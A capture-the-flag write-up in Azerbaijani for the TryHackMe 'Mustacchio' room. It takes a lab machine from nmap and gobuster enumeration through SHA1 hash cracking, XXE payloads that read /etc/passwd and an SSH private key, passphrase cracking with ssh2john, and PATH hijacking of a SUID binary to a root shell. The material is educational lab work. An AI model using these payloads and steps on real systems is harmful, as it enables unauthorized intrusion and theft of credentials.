# TryHackMe — Mustacchio Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** Mustacchio  
**Çətinlik:** Asan  
**Kateqoriya:** Web Exploitation, XXE, SSH, Privilege Escalation  
**Link:** https://tryhackme.com/room/mustacchio

---

## Məzmun

1. [Kəşfiyyat — Nmap Skan](#1-kəşfiyyat--nmap-skan)
2. [Web Enumeration — Gobuster](#2-web-enumeration--gobuster)
3. [users.bak — Hash Tapma](#3-usersbak--hash-tapma)
4. [Admin Panel — Port 8765](#4-admin-panel--port-8765)
5. [XXE — SSH Private Key Tapma](#5-xxe--ssh-private-key-tapma)
6. [SSH Key Sındırma — John](#6-ssh-key-sındırma--john)
7. [SSH — Barry Girişi](#7-ssh--barry-girişi)
8. [Privilege Escalation — Root](#8-privilege-escalation--root)
9. [Nəticə](#9-nəticə)

---

## 1. Kəşfiyyat — Nmap Skan

```bash
nmap -sV -sC -p- 10.82.162.20 --min-rate 5000
```

**Nəticə:**

| Port | Servis | Versiya        |
|------|--------|----------------|
| 22   | SSH    | OpenSSH 7.2p2  |
| 80   | HTTP   | Apache 2.4.18  |
| 8765 | HTTP   | Admin Panel    |

---

## 2. Web Enumeration — Gobuster

```bash
gobuster dir -u http://10.82.162.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tapılan qovluqlar:**
- `/images`
- `/custom`
- `/fonts`

### /custom qovluğu

`http://10.82.162.20/custom/js/` qovluğunda **`users.bak`** faylı tapılır!

```bash
wget http://10.82.162.20/custom/js/users.bak
```

---

## 3. users.bak — Hash Tapma

```bash
cat users.bak
```

**Nəticə:**
```
admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
```

Bu **SHA1** hash-dir. Sındır:

```bash
echo "1868e36a6d2b17d4c2745f1659433a54d4bc5f4b" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1 hash.txt
```

Və ya onlayn: **https://crackstation.net**

**Admin şifrəsi tapılır!**

---

## 4. Admin Panel — Port 8765

`http://10.82.162.20:8765` — login səhifəsi:

- **İstifadəçi:** `admin`
- **Şifrə:** john ilə tapılan şifrə

Daxil olduqdan sonra `home.php` mənbə kodunda 2 ipucu:

```javascript
//document.cookie = "Example=/auth/dontforget.bak";
```

```html
<!-- Barry, you can now SSH in using your key!-->
```

Saytda **XML şərh sistemi** var — bu **XXE zəifliyi** işarəsidir!

---

## 5. XXE — SSH Private Key Tapma

### XXE Zəifliyini Təsdiqlə

BurpSuite ilə XML göndər:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>&xxe;</name>
  <author>test</author>
  <com>test</com>
</comment>
```

`/etc/passwd` oxunur — **XXE uğurlu!**

### Barry-nin SSH Private Key-ini Oxu

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa">]>
<comment>
  <name>&xxe;</name>
  <author>test</author>
  <com>test</com>
</comment>
```

**Private key tapılır** — amma şifrəlidir (`ENCRYPTED`)!

---

## 6. SSH Key Sındırma — John

```bash
# Key-i fayla yaz
nano barry_id_rsa
# yapışdır

chmod 600 barry_id_rsa

# ssh2john ilə hash çıxar
ssh2john barry_id_rsa > barry_hash.txt

# John ilə sındır
john --wordlist=/usr/share/wordlists/rockyou.txt barry_hash.txt
```

**Barry-nin key şifrəsi tapılır!**

---

## 7. SSH — Barry Girişi

```bash
ssh -i barry_id_rsa barry@10.82.162.20
# Şifrə: john ilə tapılan
```

**User flag:**
```bash
cat /home/barry/user.txt
```

---

## 8. Privilege Escalation — Root

### SUID Binary Tap

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/home/joe/live_log` — SUID binary tapılır!

### Binary Analiz Et

```bash
cat /home/joe/live_log
```

İçində:
```
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
```

`tail` əmri **tam yol olmadan** çağırılır — **PATH Hijacking** zəifliyi!

### PATH Hijacking

```bash
# Saxta tail faylı yarat
echo '#!/bin/bash' > /tmp/tail
echo 'bash -i' >> /tmp/tail
chmod +x /tmp/tail

# PATH-ə əlavə et
export PATH=/tmp:$PATH

# SUID binary-ni işlət
/home/joe/live_log
```

**Root shell açılır!**

```bash
whoami
# root

cat /root/root.txt
```

**Root flag əldə edildi!**

---

## 9. Nəticə

### İstifadə edilən texnikalar

| Addım                  | Alət / Metod                    |
|------------------------|---------------------------------|
| Port skanı             | Nmap                            |
| Qovluq axtarışı        | Gobuster                        |
| Hash tapma             | users.bak faylı                 |
| Hash sındırma          | John / CrackStation             |
| Admin panel            | Port 8765                       |
| XXE                    | XML External Entity injection   |
| SSH key sındırma       | ssh2john + John                 |
| SSH giriş              | Private key (barry)             |
| Privilege Escalation   | SUID + PATH Hijacking           |

### Əldə edilən flaglar

| Flag      | Yer                        |
|-----------|----------------------------|
| User flag | `/home/barry/user.txt`     |
| Root flag | `/root/root.txt`           |

### Öyrənilənlər

- Veb serverlərdə `.bak` faylları həssas məlumat saxlaya bilər.
- SHA1 hash-lər zəifdir — CrackStation ilə asanlıqla sındırılır.
- XML qəbul edən formalar **XXE** zəifliyinə həssas ola bilər.
- SSH private key-lər şifrəli olsa belə **john** ilə sındırıla bilər.
- Tam yol olmadan çağırılan əmrlər olan SUID binary-lər **PATH Hijacking** üçün istifadə edilə bilər.
- Mənbə kodunda şərhlər (`<!-- -->`) və JS kodunda gizli yollar həmişə yoxlanılmalıdır.

---

*Writeup müəllifi: CTF həvəskarı*  
*Tarix: 2026*
